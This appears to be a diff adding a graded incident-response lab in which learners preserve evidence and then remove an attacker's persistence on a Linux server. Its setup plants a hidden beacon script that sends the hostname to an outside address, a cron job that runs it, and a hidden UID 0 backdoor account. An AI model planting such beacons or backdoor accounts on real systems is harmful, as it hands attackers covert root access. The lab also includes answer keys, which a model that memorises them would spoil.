@@ -1,0 +1,91 @@
+# Lab: lab-10 | Preserving evidence and removing persistence | u16 | 45
+The security team believes an attacker reached root on server1 last week. A suspicious script was found in /var/tmp, and the attacker probably left ways to come back (persistence). Your job is to collect the evidence before anything is cleaned up, and then remove what the attacker left, in that order. Put everything you collect in /root/evidence. Do the tasks in order: once a thing is deleted, its evidence is gone.
+
+@vars
+backdoor = sysmaint | svc-update | dbadmin2
+@endvars
+
+@setup server1
+mkdir -p /root/evidence /usr/local/bin
+printf '#!/bin/bash\n# nightly backup of /etc\ntar -czf /var/backups/etc-$(date +%%F).tar.gz /etc\n' > /usr/local/bin/backup.sh
+chmod 755 /usr/local/bin/backup.sh
+printf '#!/bin/bash\n# sysupd: keeps the system up to date\ncurl -s -o /dev/null "http://203.0.113.45/beacon?h=$(hostname)"\n' > /var/tmp/.sysupd.sh
+chmod 755 /var/tmp/.sysupd.sh
+touch -d '2026-02-27 03:12:40' /var/tmp/.sysupd.sh
+printf '30 1 * * * /usr/local/bin/backup.sh\n*/10 * * * * /var/tmp/.sysupd.sh >/dev/null 2>&1\n' | crontab -u root -
+useradd -o -u 0 -g 0 -M -d /root -s /bin/bash -c 'System maintenance' {backdoor}
+
+@task t01 | Security operations | 10 | server1
+Collect the most volatile data first. Before you change anything, save the list of running processes (`ps aux`) into /root/evidence/ps.txt and the list of network sockets with their programs (`ss -tunap`) into /root/evidence/ss.txt.
+@check server1 | both files are there and look like the right output
+grep -q 'COMMAND' /root/evidence/ps.txt && grep -q 'sshd' /root/evidence/ps.txt && grep -q 'Netid' /root/evidence/ss.txt
+@hint Redirect each command's output with > into the file.
+@solution server1
+ps aux > /root/evidence/ps.txt
+ss -tunap > /root/evidence/ss.txt
+@explain
+The order of volatility says to collect what disappears first: CPU state and memory, then running processes and network connections, then files on disk, then backups and logs kept elsewhere. A reboot or the clean-up itself would erase the process and connection lists, and they may show the attacker's live connection. On a real case you would also save the output somewhere outside the suspect system.
+@endtask
+
+@task t02 | Security operations | 15 | server1
+Preserve the suspicious script /var/tmp/.sysupd.sh: copy it to /root/evidence/sysupd.sh keeping its original modification time, owner and mode. Then start the chain-of-custody note /root/evidence/custody.txt: it must contain the script's original path and the SHA-256 hash of your copy (you may add who collected it and when).
+@check server1 | the copy is the script, with its original time (27 February, 03:12)
+grep -q '203.0.113.45' /root/evidence/sysupd.sh && stat -c %y /root/evidence/sysupd.sh | grep -q '^2026-02-27 03:12'
+@check server1 | custody.txt names the original path and the copy's SHA-256
+grep -q '/var/tmp/.sysupd.sh' /root/evidence/custody.txt && grep -q "$(sha256sum /root/evidence/sysupd.sh | awk '{print $1}')" /root/evidence/custody.txt
+@hint cp -p keeps the time, owner and mode. sha256sum FILE >> custody.txt adds the hash with the file name.
+@solution server1
+ls -la /var/tmp
+cp -p /var/tmp/.sysupd.sh /root/evidence/sysupd.sh
+echo "Original: /var/tmp/.sysupd.sh on server1, collected by root on $(date)" >> /root/evidence/custody.txt
+sha256sum /root/evidence/sysupd.sh >> /root/evidence/custody.txt
+cat /root/evidence/custody.txt
+@explain
+The hash proves later that the evidence was not changed: anyone can hash the file again and compare. The custody note records where the evidence came from, who handled it and when; every later hand-over adds a line. Without a chain of custody, evidence can be challenged in court. cp without -p would give the copy today's time and lose a clue: the time the attacker created the script.
+@endtask
+
+@task t03 | Security operations | 15 | server1
+The attacker made root's crontab run the script every 10 minutes. Save that one crontab line into /root/evidence/cron-entry.txt, then remove it from root's crontab. The nightly backup job in the same crontab must stay.
+@check server1 | the attacker's crontab line is saved as evidence
+grep -q '/var/tmp/.sysupd.sh' /root/evidence/cron-entry.txt && ! grep -q backup.sh /root/evidence/cron-entry.txt
+@check server1 | root's crontab no longer runs the script but still runs the backup
+! crontab -l -u root | grep -q sysupd && crontab -l -u root | grep -q '/usr/local/bin/backup.sh'
+@hint crontab -l prints the crontab; grep -v sysupd leaves the other lines, and crontab - installs what it reads from standard input.
+@solution server1
+crontab -l
+crontab -l | grep sysupd > /root/evidence/cron-entry.txt
+crontab -l | grep -v sysupd | crontab -
+crontab -l
+@explain
+Scheduled tasks are a favourite persistence method because they bring the attacker's code back even after the file is deleted or the server restarts. Also look in /etc/crontab, /etc/cron.d, the other users' crontabs (/var/spool/cron), systemd timers and services, and shell start-up files. Saving the line before deleting it keeps the evidence for the report and for threat hunting on other servers.
+@endtask
+
+@task t04 | Security operations | 15 | server1
+The attacker also created a second account with user ID 0, which makes it a second root. Find it, write its name into /root/evidence/backdoor-user.txt, and delete the account. Do not delete root's home folder: the account uses /root as its home.
+@check server1 | the backdoor account is named in the evidence
+test "$(cat /root/evidence/backdoor-user.txt)" = {backdoor}
+@check server1 | only root has user ID 0, and /root is still there
+test "$(awk -F: '$3 == 0 {print $1}' /etc/passwd)" = root && test -d /root/evidence
+@hint awk -F: '$3 == 0' /etc/passwd lists every account with UID 0. userdel without -r keeps the home folder.
+@solution server1
+awk -F: '$3 == 0' /etc/passwd
+awk -F: '$3 == 0 && $1 != "root" {print $1}' /etc/passwd > /root/evidence/backdoor-user.txt
+userdel -f $(cat /root/evidence/backdoor-user.txt)
+awk -F: '$3 == 0' /etc/passwd
+@explain
+Linux grants root's powers by user ID, not by name, so any account with UID 0 is root under another name; a name like {backdoor} is chosen to look harmless in a list. userdel -r would have deleted its home folder, which here is /root itself, evidence included. -f is needed on a real system because root's processes run with the same UID and userdel would refuse. Afterwards change root's password and check authorized_keys, sudoers and PAM for other back doors.
+@endtask
+
+@task t05 | Security operations | 10 | server1
+Now that the script is preserved and nothing runs it any more, delete /var/tmp/.sysupd.sh from the server. The evidence copy must stay.
+@check server1 | the script is gone from /var/tmp
+! test -e /var/tmp/.sysupd.sh
+@check server1 | the evidence copy is still there
+grep -q '203.0.113.45' /root/evidence/sysupd.sh
+@hint rm -f FILE.
+@solution server1
+rm -f /var/tmp/.sysupd.sh
+ls -la /var/tmp /root/evidence
+@explain
+Eradication comes after containment and evidence collection, never before. Recovery would follow (restoring trusted files or rebuilding the server from a known-good image, since you can rarely be sure you found everything an attacker with root changed), and then the lessons learned meeting: how did the attacker get root, and how do we stop it next time?
+@endtask
